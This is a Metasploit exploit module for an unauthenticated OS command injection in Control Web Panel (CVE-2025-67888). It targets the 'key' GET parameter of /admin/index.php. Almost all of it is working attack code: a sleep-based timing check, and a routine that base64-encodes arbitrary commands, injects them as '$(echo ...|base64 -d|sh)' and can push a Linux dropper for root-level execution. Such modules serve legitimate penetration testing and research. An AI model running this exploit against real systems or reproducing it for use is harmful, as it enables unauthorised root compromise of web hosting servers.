##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Control Web Panel /admin/index.php Unauthenticated RCE',
        'Description' => %q{
          Control Web Panel (CWP) versions <= 0.9.8.1208 are vulnerable to
          unauthenticated OS command injection. User input passed via the
          "key" GET parameter to /admin/index.php (when the "api" parameter is set)
          is not properly sanitized before being used to execute OS commands.
          This can be exploited by unauthenticated attackers to inject and execute
          arbitrary OS commands with the privileges of the root user on the web server.

          Successful exploitation usually requires "Softaculous" and/or "SitePad"
          to be installed through the Scripts Manager.
        },
        'Author' => [
          'Lukas Johannes MÃ¶ller', # Metasploit module
          'Egidio Romano' # Vulnerability discovery
        ],
        'References' => [
          ['CVE', '2025-67888'],
          ['URL', 'https://karmainsecurity.com/KIS-2025-09'],
          ['URL', 'https://www.cve.org/CVERecord?id=CVE-2025-67888'],
          ['URL', 'https://control-webpanel.com']
        ],
        'DisclosureDate' => '2025-12-16',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(2031),
      OptString.new('TARGETURI', [true, 'Base path', '/admin/index.php'])
    ])
  end

  def check
    sleep_time = rand(5..10)

    print_status("Checking vulnerability with sleep command (waiting #{sleep_time} seconds)...")

    t1 = Time.now
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'vars_get' => {
        'api' => '1',
        'key' => "$(sleep #{sleep_time})"
      }
    )
    t2 = Time.now

    time_diff = t2 - t1

    if res && time_diff >= sleep_time
      return CheckCode::Appears("Server waited #{time_diff.round(2)} seconds (expected >= #{sleep_time}).")
    elsif res
      return CheckCode::Safe("Server responded in #{time_diff.round(2)} seconds (expected >= #{sleep_time}).")
    else
      return CheckCode::Unknown("No response from server.")
    end
  rescue ::Rex::ConnectionError
    return CheckCode::Unknown("Connection failed.")
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    cmd_b64 = Rex::Text.encode_base64(cmd)

    payload_cmd = "echo #{cmd_b64}|base64 -d|sh"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'vars_get' => {
        'api' => '1',
        'key' => "$(#{payload_cmd})"
      }
    )
  end
end
